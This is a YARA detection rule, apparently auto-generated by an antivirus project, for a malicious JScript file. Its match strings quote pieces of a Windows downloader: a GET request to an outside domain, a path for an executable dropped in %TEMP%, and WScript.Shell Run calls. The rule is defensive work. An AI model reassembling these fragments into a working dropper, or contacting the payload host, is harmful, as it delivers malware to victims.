rule sig_20160328_b1d62acab8800830e2e2bd1dc1df7460 {
  meta:
    description = "datamaliciousorder - file 20160328_b1d62acab8800830e2e2bd1dc1df7460.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "250a25c8bc8f6053337d8cb543465ad76d84dcaf6d26ee03b9eb643a9f57184d"

  strings:
    $s1  = "function Ykjml() {return Nnqejc[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"9zUQ3tGkYEtBD.exe\";};" fullword ascii
    $s2  = "Kkdphcka[Qtphfmfyj](\"GET\", \"http://aicuiibf.com/l30woad\", false);" fullword ascii
    $s3  = "do {WScript[Afbdtrrt](Tskicznyug() * 11)} while (Kkdphcka[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Nnqejc = function Pgmrdf() {return WScript[Rujhv](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Yyloyyf(Njlvokuy, Zboumq){return Njlvokuy - Zboumq;};" fullword ascii
    $s6  = "function Qkqookiat(Xjsoovu){Nnqejc[\"Run\"](Xjsoovu, Eaujx, Eaujx);};" fullword ascii
    $s7  = " while (Smcdcmdxo){" fullword ascii
    $s8  = "function Ifyvghjw() {return ((Rqhfgsg == true) && (Rqhfgsg == Efyolszj)) ? 1 : Eaujx;};" fullword ascii
    $s9  = "function Goidfsnbp()" fullword ascii
    $s10 = "function Jkbwdzgo(){return Rujhv;};" fullword ascii
    $s11 = "Rqhfgsg = true; " fullword ascii
    $s12 = "var Efyolszj = false;" fullword ascii
    $s13 = "Efyolszj = true; " fullword ascii
    $s14 = "var Rqhfgsg = false;" fullword ascii
    $s15 = "return Yyloyyf(Lewmqyvzz, Ijtrsq);" fullword ascii
    $s16 = "function Mnyksu(Evjhh) {var Wrmwwrzbrp = (1, 2, 3, 4, 5, Evjhh); return Wrmwwrzbrp;};" fullword ascii
    $s17 = "function Tskicznyug(){return 22;};" fullword ascii
    $s18 = "function Crzutsaavn(){return Skdug;};" fullword ascii
    $s19 = "var Oolntxq = false;" fullword ascii
    $s20 = "var Juvormtx = new this[\"Date\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}